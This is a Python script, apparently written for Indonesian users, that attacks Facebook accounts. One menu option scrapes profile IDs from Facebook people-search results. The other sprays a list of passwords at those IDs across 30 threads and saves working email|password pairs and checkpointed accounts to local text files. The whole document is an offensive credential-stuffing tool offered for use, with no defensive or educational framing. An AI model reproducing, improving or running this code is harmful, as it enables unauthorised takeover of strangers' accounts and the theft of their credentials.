import requests,bs4,sys,os
import requests,sys
from multiprocessing.pool import ThreadPool

class crack:
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		try:
			self.fl=open(raw_input("Nama File: ")).read().splitlines()
		except Exception as e:
			print "!: %s"%e
			crack()
		print "Contoh: pass123,pass12345"
		self.pwlist()
		
	def pwlist(self):
		self.pw=raw_input("List Password: ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			print '\x1b[1;92mMemulai Crack'
			print '\x1b[1;92mAkun No Cp Di Simpan Di: multiresult.txt'
			print '\x1b[1;92mAkun Cp Di Simpan Di: checkpoint.txt'
			ThreadPool(30).map(self.main,self.fl)
			exit("\n[✔️]Mengambil ID Selesai")
		
	def main(self,fl):
		try:
			for i in self.pw:
				r=requests.Session()
				r.get("https://mbasic.facebook.com/login")
				r.headers.update({"User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36"})
				b=r.post("https://mbasic.facebook.com/login", data={"email":fl,"pass":i}).url
				if "c_user" in r.cookies.get_dict():
					self.ada.append("%s|%s"%(fl,i))
					open("multiresult.txt","a+").write("%s|%s\n"%(fl,i))
				if "checkpoint" in b:
					self.cp.append("%s|%s"%(fl,i))
					open("checkpoint.txt","a+").write("%s|%s\n"%(fl,i))
			self.ko+=1
			print "\r[Crack] %s/%s - found-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
			
def search(fl,r,b):
	open(fl,"a+")
	b=bs4.BeautifulSoup(r.get(b).text,"html.parser")
	for i in b.find_all("a",href=True):
		print "\r[Mengambil]: %s ID..."%(len(open(fl).read().splitlines())),;sys.stdout.flush()
		if "<img alt=" in str(i):
			if "home.php" in str(i["href"]):
				continue
			else:
				g=str(i["href"])
				if "profile.php" in g:
					d=bs4.re.findall("/profile\.php\?id=(.*?)&",g)
					if len (d) !=0:
						pk="".join(d)
						open(fl,"a+").write("%s\n"%(pk))
				else:
					d=bs4.re.findall("/(.*?)\?",g)
					if len(d) !=0:
						pk="".join(d)
						open(fl,"a+").write("%s\n"%(pk))
		if "Lihat Hasil Selanjutnya" in i.text:
			search(fl,r,i["href"])
	print "\n[+] finished."
				

def dumpfl():
	r=requests.Session()
	r.get("https://mbasic.facebook.com/login")
	r.headers.update({"User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36"})
	r.post("https://mbasic.facebook.com/login", data={"email":raw_input("Email: "),"pass":raw_input("?: Passs: ")}).url
	if "c_user" in r.cookies.get_dict():
		fl=raw_input("Nama File: ")
		s=raw_input("Nama Pengguna: ")
		search(fl,r,"https://mbasic.facebook.com/search/people/?q="+s)
	


while True:
	print '\x1b[1;92m[1] Dump ID By Search Name'
	print '\x1b[1;92m[2] Start Crack\n'
	r=raw_input("[✔️]Pilih : ")
	if r=="":
		os.system("clear")
	elif r =="1":
		dumpfl()
	elif r=="2":
		crack()
	else:
		print "!: wrong input"